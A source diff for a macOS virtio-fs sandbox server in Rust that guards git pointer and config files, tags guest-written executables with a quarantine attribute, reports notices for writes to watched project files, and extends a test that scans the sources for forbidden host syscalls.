++        // R15: a size change through a pointer file's own handle changes only its buffer.
++        if let (true, Some(h)) = (valid.contains(SetattrValid::SIZE), handle) {
++            let mut st = self.lock();
++            if let Some(reply) = self.pointer_resize(&mut st, &ctx, inode, h, attr.st_size)? {
++                return Ok(reply);
++            }
++        }
+         self.admit(&Mutation::Setattr { node: inode, valid, mode: attr.st_mode as u32 })?;
+         let mut st = self.lock();
+         let kind = st.nodes.get(&inode).ok_or_else(|| err(lx::ESTALE))?.kind;
+@@ -809,11 +864,13 @@ impl FileSystem for ConfinedFs {
+                     let held = Self::handle(&mut st, inode, h)?;
+                     if !size || held.writable {
+                         let fd = held.fd();
++                        self.tag_setattr(fd, &attr, valid)?;
+                         return self.apply_setattr(&ctx, fd, &attr, valid);
+                     }
+                 }
+                 let access = if size { libc::O_WRONLY } else { libc::O_RDONLY };
+                 let fd = self.open_file(&mut st, inode, access)?;
++                self.tag_setattr(fd.as_raw_fd(), &attr, valid)?;
+                 self.apply_setattr(&ctx, fd.as_raw_fd(), &attr, valid)
+             }
+             _ => Err(err(lx::EPERM)),
+@@ -880,7 +937,10 @@ impl FileSystem for ConfinedFs {
+         self.admit(&Mutation::Unlink { parent, name })?;
+         let mut st = self.lock();
+         let pfd = self.dir_fd(&mut st, parent)?;
+-        self.host.unlinkat(pfd.as_raw_fd(), name, false)
++        let gone = self.git_identity(&st, pfd.as_raw_fd(), name.to_bytes());
++        self.host.unlinkat(pfd.as_raw_fd(), name, false)?;
++        self.git_forget(&mut st, gone);
++        Ok(())
+     }
+ 
+     fn rmdir(&self, _ctx: Context, parent: u64, name: &CStr) -> io::Result<()> {
+@@ -888,7 +948,10 @@ impl FileSystem for ConfinedFs {
+         self.admit(&Mutation::Rmdir { parent, name })?;
+         let mut st = self.lock();
+         let pfd = self.dir_fd(&mut st, parent)?;
+-        self.host.unlinkat(pfd.as_raw_fd(), name, true)
++        let gone = self.git_identity(&st, pfd.as_raw_fd(), name.to_bytes());
++        self.host.unlinkat(pfd.as_raw_fd(), name, true)?;
++        self.git_forget(&mut st, gone);
++        Ok(())
+     }
+ 
+     fn rename(&self, _ctx: Context, olddir: u64, oldname: &CStr, newdir: u64, newname: &CStr, flags: u32) -> io::Result<()> {
+@@ -918,11 +981,18 @@ impl FileSystem for ConfinedFs {
+         } else {
+             None
+         };
++        let replaced = self.git_identity(&st, nfd.as_raw_fd(), newname.to_bytes());
+         self.host.renameat(ofd.as_raw_fd(), oldname, nfd.as_raw_fd(), newname, extra)?;
+         self.moved(&mut st, dev_ino(&src), newdir, newname);
+         if let Some(d) = dst {
+             self.moved(&mut st, dev_ino(&d), olddir, oldname);
+         }
++        if st.git.is_some() {
++            // R15: held classes follow the names; a config renamed in is held and re-read.
++            self.git_forget(&mut st, Some(dev_ino(&src)));
++            self.git_forget(&mut st, replaced);
++            let _ = self.git_renamed(&mut st, newdir, newname.to_bytes(), dev_ino(&src));
++        }
+         Ok(())
+     }
+ 
+@@ -977,16 +1047,36 @@ impl FileSystem for ConfinedFs {
+                 if flags & LINUX_O_APPEND != 0 {
+                     host |= libc::O_APPEND;
+                 }
+-                (self.open_file(&mut st, inode, host)?, false)
++                let fd = self.open_file(&mut st, inode, host)?;
++                // R16: a write-open of an executable tags it first.
++                if write && self.quarantine && sys::fstat(&fd)?.st_mode & 0o111 != 0 {
++                    quarantine::tag(fd.as_raw_fd()).map_err(|_| err(lx::EIO))?;
++                }
++                (fd, false)
+             }
+             // R9: OPEN of anything but a regular file or a directory.
+             _ => return Err(err(lx::EACCES)),
+         };
+-        if truncate {
+-            // R2: a truncating open is an open, the (dev, ino) check, then ftruncate on that descriptor.
+-            sys::ftruncate(fd.as_raw_fd(), 0)?;
+-        }
++        // R15: a pointer file opened for writing is written through a checked buffer.
++        let pointer = if write && !dir { self.git_pointer_node(&mut st, inode)? } else { None };
++        let pointer = match pointer {
++            Some(kind) if truncate => Some(git::Pointer { kind, buf: Vec::new(), dirty: true }),
++            Some(kind) => {
++                let current = self.open_file(&mut st, inode, libc::O_RDONLY)?;
++                Some(git::Pointer { kind, buf: Self::read_pointer(&current)?, dirty: false })
++            }
++            None => {
++                if truncate {
++                    // R2: a truncating open is an open, the (dev, ino) check, then ftruncate on that descriptor.
++                    sys::ftruncate(fd.as_raw_fd(), 0)?;
++                }
++                None
++            }
++        };
+         let h = self.add_handle(&mut st, inode, fd, write, dir)?;
++        if let Some(held) = st.handles.get_mut(&h) {
++            held.pointer = pointer;
++        }
+         // R12: CachePolicy::Auto (no direct I/O, no keep-cache).
+         Ok((Some(h), OpenOptions::empty()))
+     }
+@@ -1017,6 +1107,7 @@ impl FileSystem for ConfinedFs {
+             host |= libc::O_APPEND;
+         }
+         // R2: O_CREAT | O_EXCL on the parent descriptor, so a create never lands on an existing node.
++        let pointer = self.git_pointer_name(&st, name.to_bytes());
+         let fd = self.host.openat(pfd.as_raw_fd(), name, host, 0o600)?;
+         let mode = mode & MODE_MASK;
+         // R7: the exact masked mode, whatever the process umask removed.
+@@ -1028,6 +1119,10 @@ impl FileSystem for ConfinedFs {
+         let s = sys::fstat(&fd)?;
+         let id = self.insert(&mut st, parent, name, &s)?;
+         let h = self.add_handle(&mut st, id, fd, access != 0, false)?;
++        // R15: a new pointer file stays empty on the host until its content is checked.
++        if let (Some(kind), Some(held)) = (pointer, st.handles.get_mut(&h)) {
++            held.pointer = Some(git::Pointer { kind, buf: Vec::new(), dirty: false });
++        }
+         Ok((self.entry(&ctx, id, s), Some(h), OpenOptions::empty()))
+     }
+ 
+@@ -1061,6 +1156,12 @@ impl FileSystem for ConfinedFs {
+         _kill_priv: bool,
+         _flags: u32,
+     ) -> io::Result<usize> {
++        {
++            let mut st = self.lock();
++            if let Some(n) = self.pointer_write(&mut st, inode, handle, &mut r, size, offset)? {
++                return Ok(n);
++            }
++        }
+         self.admit(&Mutation::Write { node: inode, handle })?;
+         let mut st = self.lock();
+         let h = Self::handle(&mut st, inode, handle)?;
+@@ -1073,7 +1174,9 @@ impl FileSystem for ConfinedFs {
+ 
+     fn flush(&self, _ctx: Context, inode: u64, handle: u64, _lock_owner: u64) -> io::Result<()> {
+         let mut st = self.lock();
+-        Self::handle(&mut st, inode, handle).map(drop)
++        Self::handle(&mut st, inode, handle)?;
++        // R15: a pointer file's buffered content is checked here, and written only if it passes.
++        self.settle_pointer(&mut st, inode, handle)
+     }
+ 
+     fn fsync(&self, _ctx: Context, inode: u64, _datasync: bool, handle: u64) -> io::Result<()> {
+@@ -1104,6 +1207,8 @@ impl FileSystem for ConfinedFs {
+     fn release(&self, _ctx: Context, inode: u64, _flags: u32, handle: u64, _flush: bool, _flock: bool, _owner: Option<u64>) -> io::Result<()> {
+         let mut st = self.lock();
+         Self::handle(&mut st, inode, handle)?;
++        // R15: content written after the last FLUSH is checked too; a failure leaves the host untouched.
++        let _ = self.settle_pointer(&mut st, inode, handle);
+         st.handles.remove(&handle);
+         Ok(())
+     }
+@@ -1221,6 +1326,104 @@ impl FileSystem for ConfinedFs {
+ }
+ 
+ impl ConfinedFs {
++    /// R16: a SETATTR that adds an execute bit to a regular file, or truncates one that has an execute
++    /// bit, tags it first; a tag failure fails the call (`EIO`) before anything changes.
++    fn tag_setattr(&self, fd: RawFd, attr: &bindings::stat64, valid: SetattrValid) -> io::Result<()> {
++        if !self.quarantine {
++            return Ok(());
++        }
++        let current = sys::fstat_raw(fd)?.st_mode as u32 & 0o111;
++        let adds = valid.contains(SetattrValid::MODE) && attr.st_mode as u32 & MODE_MASK & 0o111 & !current != 0;
++        let truncates = valid.contains(SetattrValid::SIZE) && current != 0;
++        if adds || truncates {
++            quarantine::tag(fd).map_err(|_| err(lx::EIO))?;
++        }
++        Ok(())
++    }
++
++    /// R15: the current content of a pointer file opened for writing (at most `POINTER_MAX` bytes).
++    fn read_pointer(fd: &OwnedFd) -> io::Result<Vec<u8>> {
++        use std::os::unix::fs::FileExt;
++        let mut buf = vec![0u8; POINTER_MAX + 1];
++        let file = File::from(fd.try_clone()?);
++        let mut len = 0;
++        while len < buf.len() {
++            let n = file.read_at(&mut buf[len..], len as u64)?;
++            if n == 0 {
++                break;
++            }
++            len += n;
++        }
++        if len > POINTER_MAX {
++            return Err(err(lx::EPERM));
++        }
++        buf.truncate(len);
++        Ok(buf)
++    }
++
++    /// R15: a WRITE through a pointer file's handle goes to its buffer (at most `POINTER_MAX` bytes in
++    /// total; more is `EPERM`). `None` when the handle is not a pointer file's.
++    fn pointer_write<R: io::Read>(&self, st: &mut State, inode: u64, handle: u64, r: &mut R, size: u32, offset: u64) -> io::Result<Option<usize>> {
++        let Some(h) = st.handles.get_mut(&handle).filter(|h| h.node == inode) else { return Ok(None) };
++        let writable = h.writable;
++        let Some(p) = h.pointer.as_mut() else { return Ok(None) };
++        if !writable {
++            return Err(err(lx::EBADF));
++        }
++        // The buffer bypasses the git rules (they would refuse a pointer file), never the policy hooks.
++        self.hooks.admit(&Mutation::Write { node: inode, handle })?;
++        let end = offset.checked_add(u64::from(size)).filter(|e| *e <= POINTER_MAX as u64);
++        let Some(end) = end else {
++            self.notices.push(NoticeKind::GitProtected);
++            return Err(err(lx::EPERM));
++        };
++        let mut data = vec![0u8; size as usize];
++        r.read_exact(&mut data)?;
++        if p.buf.len() < end as usize {
++            p.buf.resize(end as usize, 0);
++        }
++        p.buf[offset as usize..end as usize].copy_from_slice(&data);
++        p.dirty = true;
++        Ok(Some(size as usize))
++    }
++
++    /// R15: a truncate through a pointer file's handle resizes its buffer. `None` when the handle is not a
++    /// pointer file's.
++    fn pointer_resize(&self, st: &mut State, ctx: &Context, inode: u64, handle: u64, size: i64) -> io::Result<Option<(bindings::stat64, Duration)>> {
++        let Some(h) = st.handles.get_mut(&handle).filter(|h| h.node == inode) else { return Ok(None) };
++        let fd = h.fd();
++        let Some(p) = h.pointer.as_mut() else { return Ok(None) };
++        self.hooks.admit(&Mutation::Setattr { node: inode, valid: SetattrValid::SIZE, mode: 0 })?;
++        if size < 0 || size as usize > POINTER_MAX {
++            self.notices.push(NoticeKind::GitProtected);
++            return Err(err(lx::EPERM));
++        }
++        p.buf.resize(size as usize, 0);
++        p.dirty = true;
++        let mut s = sys::fstat_raw(fd)?;
++        s.st_size = size;
++        Ok(Some((self.simplified(ctx, s), TIMEOUT)))
++    }
++
++    /// R15: checks a pointer file's buffered content and, only if it passes, writes it to the host through
++    /// the handle's descriptor. A failure is `EPERM` and the host file keeps what it had (empty for a new
++    /// one).
++    fn settle_pointer(&self, st: &mut State, inode: u64, handle: u64) -> io::Result<()> {
++        use std::os::unix::fs::FileExt;
++        let Some(p) = st.handles.get_mut(&handle).and_then(|h| h.pointer.as_mut()) else { return Ok(()) };
++        if !p.dirty {
++            return Ok(());
++        }
++        p.dirty = false;
++        let (kind, buf) = (p.kind, p.buf.clone());
++        self.git_pointer_check(st, inode, kind, &buf)?;
++        let h = st.handles.get(&handle).ok_or_else(|| err(lx::EBADF))?;
++        // A pointer file's handle is always a file handle.
++        let Body::File(file) = &h.body else { return Err(err(lx::EBADF)) };
++        sys::ftruncate(file.as_raw_fd(), 0)?;
++        file.write_all_at(&buf, 0)
++    }
++
+     fn apply_setattr(&self, ctx: &Context, fd: RawFd, attr: &bindings::stat64, valid: SetattrValid) -> io::Result<(bindings::stat64, Duration)> {
+         if valid.contains(SetattrValid::MODE) {
+             // R7: masked, never setuid, setgid or sticky.
+diff --git a/src/devices/src/virtio/fs/macos/confined/notice.rs b/src/devices/src/virtio/fs/macos/confined/notice.rs
+new file mode 100644
+index 0000000..959d88d
+--- /dev/null
++++ b/src/devices/src/virtio/fs/macos/confined/notice.rs
+@@ -0,0 +1,79 @@
++// R15: the `share_notice` sink. The server records the first notice of each kind per incarnation; the
++// device layer drains it and the worker sends `share_notice{tag, kind}` (tagging and the one-per-second
++// rate limit are the worker's). The sink is bounded by construction: at most one entry per kind.
++
++use std::collections::VecDeque;
++use std::sync::{Arc, Mutex};
++
++/// The `kind` of a `share_notice` (design 2.4).
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++pub enum NoticeKind {
++    /// An R15 refusal: a `.git/hooks` entry, a risky config key, a git directory move, a pointer file, a
++    /// tracked hook or an include target.
++    GitProtected,
++    /// An allowed write to a watched name (T18, T19).
++    Envrc,
++    VscodeTasks,
++    VscodeSettings,
++    CodeWorkspace,
++    IdeaProject,
++}
++
++impl NoticeKind {
++    pub const ALL: [NoticeKind; 6] = [
++        NoticeKind::GitProtected,
++        NoticeKind::Envrc,
++        NoticeKind::VscodeTasks,
++        NoticeKind::VscodeSettings,
++        NoticeKind::CodeWorkspace,
++        NoticeKind::IdeaProject,
++    ];
++
++    /// The wire value of `kind`.
++    pub fn wire(self) -> &'static str {
++        match self {
++            NoticeKind::GitProtected => "git_protected",
++            NoticeKind::Envrc => "envrc",
++            NoticeKind::VscodeTasks => "vscode_tasks",
++            NoticeKind::VscodeSettings => "vscode_settings",
++            NoticeKind::CodeWorkspace => "code_workspace",
++            NoticeKind::IdeaProject => "idea_project",
++        }
++    }
++
++    fn bit(self) -> u8 {
++        1 << NoticeKind::ALL.iter().position(|k| *k == self).unwrap_or(0)
++    }
++}
++
++/// The most notices the sink ever holds: one per kind.
++pub const NOTICE_CAPACITY: usize = NoticeKind::ALL.len();
++
++#[derive(Default)]
++struct Sink {
++    reported: u8,
++    pending: VecDeque<NoticeKind>,
++}
++
++/// A bounded, deduplicated queue of notices, shared between the server (which pushes on the device
++/// thread) and the device layer (which drains). Cloning shares the same queue.
++#[derive(Clone, Default)]
++pub struct ShareNotices(Arc<Mutex<Sink>>);
++
++impl ShareNotices {
++    /// Records `kind` unless it was already reported in this incarnation.
++    pub fn push(&self, kind: NoticeKind) {
++        let mut sink = self.0.lock().unwrap_or_else(|e| e.into_inner());
++        if sink.reported & kind.bit() != 0 || sink.pending.len() >= NOTICE_CAPACITY {
++            return;
++        }
++        sink.reported |= kind.bit();
++        sink.pending.push_back(kind);
++    }
++
++    /// Takes every pending notice, oldest first.
++    pub fn drain(&self) -> Vec<NoticeKind> {
++        let mut sink = self.0.lock().unwrap_or_else(|e| e.into_inner());
++        sink.pending.drain(..).collect()
++    }
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/quarantine.rs b/src/devices/src/virtio/fs/macos/confined/quarantine.rs
+new file mode 100644
+index 0000000..3f142a4
+--- /dev/null
++++ b/src/devices/src/virtio/fs/macos/confined/quarantine.rs
+@@ -0,0 +1,40 @@
++// R16: the quarantine tag on guest-created files. The server itself, never the guest, sets exactly
++// `com.apple.quarantine` by `fsetxattr` on a descriptor it holds (R7's one carve-out); R0 keeps the whole
++// xattr family away from the guest. This is the only xattr call in the server.
++
++use std::ffi::CStr;
++use std::io;
++use std::os::fd::RawFd;
++use std::time::{SystemTime, UNIX_EPOCH};
++
++use super::sys::{err, lx};
++
++/// The one attribute the server ever writes.
++pub const QUARANTINE_NAME: &CStr = c"com.apple.quarantine";
++/// The flag word of the tag (an SH2 decision, checked at G7: Gatekeeper must treat the file as downloaded).
++pub const QUARANTINE_FLAGS: &str = "0081";
++/// The agent field of the tag.
++pub const QUARANTINE_AGENT: &str = "Winter Cowork";
++
++/// `0081;<creation time, hex seconds>;Winter Cowork;` (no event UUID).
++pub fn value_at(seconds: u64) -> String {
++    format!("{QUARANTINE_FLAGS};{seconds:08x};{QUARANTINE_AGENT};")
++}
++
++#[cfg(test)]
++pub static FAIL_NEXT: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
++
++/// Sets the tag on `fd`. A failure is returned, never skipped (the caller answers `EIO`).
++pub fn tag(fd: RawFd) -> io::Result<()> {
++    // The tests make the next call fail for real (a closed descriptor) to prove the failure path.
++    #[cfg(test)]
++    let fd = if FAIL_NEXT.swap(false, std::sync::atomic::Ordering::SeqCst) { -1 } else { fd };
++    let now = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
++    let value = value_at(now);
++    // SAFETY: the name is a valid C string and the value a live buffer of the given length.
++    let res = unsafe { libc::fsetxattr(fd, QUARANTINE_NAME.as_ptr(), value.as_ptr().cast(), value.len(), 0, 0) };
++    if res < 0 {
++        return Err(err(lx::EIO));
++    }
++    Ok(())
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/sys.rs b/src/devices/src/virtio/fs/macos/confined/sys.rs
+index 266b812..3a6c2fe 100644
+--- a/src/devices/src/virtio/fs/macos/confined/sys.rs
++++ b/src/devices/src/virtio/fs/macos/confined/sys.rs
+@@ -211,3 +211,35 @@ pub fn fstatvfs(fd: RawFd) -> io::Result<libc::statvfs> {
+     check(unsafe { libc::fstatvfs(fd, st.as_mut_ptr()) })?;
+     Ok(unsafe { st.assume_init() })
+ }
++
++/// R15: whether the volume of `fd` compares names case-sensitively (`fpathconf(_PC_CASE_SENSITIVE)`).
++/// Anything but 1 (0, or an error) is treated as case-insensitive, the wider match.
++pub fn case_sensitive(fd: RawFd) -> bool {
++    unsafe { libc::fpathconf(fd, libc::_PC_CASE_SENSITIVE) == 1 }
++}
++
++/// R15: the names in a held directory (`.` and `..` left out), read through a duplicate of its descriptor.
++pub fn list_dir(fd: RawFd) -> io::Result<Vec<Vec<u8>>> {
++    let dup = check(unsafe { libc::dup(fd) })?;
++    let dir = unsafe { libc::fdopendir(dup) };
++    if dir.is_null() {
++        let e = host_err();
++        unsafe { libc::close(dup) };
++        return Err(e);
++    }
++    unsafe { libc::rewinddir(dir) };
++    let mut names = Vec::new();
++    loop {
++        let entry = unsafe { libc::readdir(dir) };
++        if entry.is_null() {
++            break;
++        }
++        // SAFETY: readdir returned a valid entry; the name is copied at once.
++        let name = unsafe { std::slice::from_raw_parts((*entry).d_name.as_ptr().cast::<u8>(), usize::from((*entry).d_namlen)).to_vec() };
++        if name != b"." && name != b".." {
++            names.push(name);
++        }
++    }
++    unsafe { libc::closedir(dir) };
++    Ok(names)
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/tests.rs b/src/devices/src/virtio/fs/macos/confined/tests.rs
+index 79d4ad1..8e58ba9 100644
+--- a/src/devices/src/virtio/fs/macos/confined/tests.rs
++++ b/src/devices/src/virtio/fs/macos/confined/tests.rs
+@@ -387,6 +387,10 @@ fn within<T: Send + 'static>(seconds: u64, f: impl FnOnce() -> T + Send + 'stati
+     rx.recv_timeout(Duration::from_secs(seconds)).expect("the device thread blocked")
+ }
+ 
++// The R15 and R16 suites.
++#[path = "git_tests.rs"]
++mod git_tests;
++
+ // ---- R0: opcode allowlist, INIT ----------------------------------------------------------------------
+ 
+ #[test]
+@@ -667,18 +671,30 @@ fn r2_host_calls_refuse_parent_absolute_and_symlinked_paths_on_their_own() {
+ 
+ #[test]
+ fn r2_no_path_open_no_volfs_no_realpath_in_the_server() {
+-    let sources = [include_str!("mod.rs"), include_str!("sys.rs"), include_str!("names.rs")];
++    let sources = [
++        include_str!("mod.rs"),
++        include_str!("sys.rs"),
++        include_str!("names.rs"),
++        include_str!("git.rs"),
++        include_str!("gitconfig.rs"),
++        include_str!("notice.rs"),
++        include_str!("quarantine.rs"),
++    ];
+     let volfs = concat!("/", ".vol");
+     let needles = [
+         "libc::open(", "AT_FDCWD", "realpath(", volfs, "libc::renameat(", "libc::umask", "File::open", "std::path", "libc::stat(", "libc::lstat(",
+         "libc::chmod(", "libc::mkdir(", "libc::unlink(", "libc::rename(", "libc::symlink(", "libc::link(", "libc::readlink(", "libc::truncate(",
+-        "libc::utimes(", "libc::setxattr(", "libc::fsetxattr(", "libc::mknod", "libc::mkfifo",
++        "libc::utimes(", "libc::setxattr(", "libc::mknod", "libc::mkfifo", "getxattr(", "removexattr(", "listxattr(", "canonicalize(",
+     ];
+     for source in sources {
+         for needle in needles {
+             assert!(!source.contains(needle), "{needle}");
+         }
+     }
++    // R7's one carve-out (R16): a single fsetxattr, in quarantine.rs, of the one fixed name.
++    let calls: Vec<usize> = sources.iter().map(|s| s.matches(concat!("libc::", "fsetxattr(")).count()).collect();
++    assert_eq!(calls, [0, 0, 0, 0, 0, 0, 1]);
++    assert!(include_str!("quarantine.rs").contains(concat!("libc::", "fsetxattr(fd, QUARANTINE_NAME.as_ptr(),")));
+ }
+ 
+ #[test]
